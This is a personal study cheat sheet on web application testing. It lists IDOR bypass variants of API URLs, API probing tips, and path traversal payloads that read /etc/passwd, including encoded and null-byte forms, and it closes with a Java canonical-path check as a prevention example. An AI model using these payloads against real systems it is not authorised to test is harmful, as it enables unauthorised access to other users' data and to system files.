# LEARNINGS 
## IDOR
-Check all id based values in all requests 
-Try playing same requests with different cookies and credentials of different account
-Try swapping ID based values interchangeably
-Do request from admin privelege activities,save them in repeater and modify it if it passes as you want that is a bug
some payloads or ways of guessing:
Path normalization:
/api/v5/users/9 => 404
/api/v5/users/9/ => 200

### Double Slash
/api/v5/users/9 => 404
/api/v5/users/9// => 200

### Version downgrade
/api/v5/users/9 => 404
/api/v4/users/9 => 200

### Endpoint variant
/api/v5/users/9 => 404
/api/v5/users/9/details => 200

### Multi-ID abuse
/api/v5/users/9 => 404
/api/v5/users/10,9 => 200
/api/v5/users/10.9 => 200
/api/v5/users?=10,9 => 200

### Type confusion
/api/v5/users/9 => 404
/api/v5/users/9abc => 200

### Leading zero
/api/v5/users/9 => 404
/api/v5/users/0x63 => 200

### NULL/Termination

/api/v5/users/9 => 404
/api/v5/users/9%00 => 200

### Header bypass

/api/v5/users/9 => 404
/api/v5/users/9 + X-ORIGINAL-URL:/api/v5/users/10 => 200

### Encoded space-bypass
/api/v5/users/9 => 404
/api/v5/users/%209 => 200

## XSS



## API-Testing
Always try editing the request
/api/v5/users/carlos => 200 
/api/v5/users => 400
/api=> 303
Open this response into browser and you may access documentation with functionalities 

Try swapping GET into OPTIONS AND PATCH type.

## Path Traversal
## Linux

```text
/etc/passwd
```

### Relative Path Traversal

../../../etc/passwd

../../../../etc/passwd

### URL-Encoded Dot (`.`)

.  -> %2e
.  -> %252e (double encoded)

### URL-Encoded Slash (`/`)

/  -> %2f
/  -> %252f (double encoded)


### URL-Encoded Space

space -> %20

### Null Byte Injection

%00

- Used as a **null byte** to terminate strings on vulnerable applications.
- Often useful when bypassing file extension validation.

Example:

../../../etc/passwd%00.png

 Base Folder Discovery

The application's **base directory** can often be identified through directory enumeration or documentation.

Example base paths:

/var/www/images/

Possible traversal:

/var/www/images/../../../etc/passwd

Prevention

Validate the **canonical path** before accessing files.

Example (Java):

```java
File file = new File(BASE_DIR, userInput);

if (file.getCanonicalPath().startsWith(BASE_DIR)) {
    // Safe to access
}
```

This ensures that the resolved path remains inside the intended base directory and prevents path traversal attacks.



